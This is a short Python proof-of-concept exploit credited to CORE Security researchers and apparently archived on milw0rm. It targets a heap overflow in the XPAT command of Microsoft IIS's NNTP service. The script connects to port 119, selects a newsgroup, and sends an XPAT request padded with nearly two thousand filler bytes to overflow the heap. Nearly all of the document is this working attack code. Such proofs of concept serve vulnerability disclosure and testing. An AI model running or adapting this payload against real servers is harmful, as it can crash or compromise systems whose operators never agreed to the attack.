#--
# IIS NNTP Service XPAT command heap overflow proof of concept
#
# Author:
#    Lucas Lavarello (lucas at coresecurity dot com)
#    Juliano Rizzo   (juliano at coresecurity dot com)
#
# Copyright (c) 2001-2004 CORE Security Technologies, CORE SDI Inc.
# All rights reserved.
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE
#
# www coresecurity com
#--
from socket import * 

host = "127.0.0.1"
pat = "C"*1946  + " " + "X"*10

newsgroup = "control.newgroup"

sock = socket(AF_INET, SOCK_STREAM)
sock.connect((host, 119))

print sock.recv(512)

sock.send("group %s\x0d\x0a" % newsgroup)

print sock.recv(512)

sock.send("xpat From 1-9 %s \x0d\x0a" % pat)


# milw0rm.com [2004-10-16]
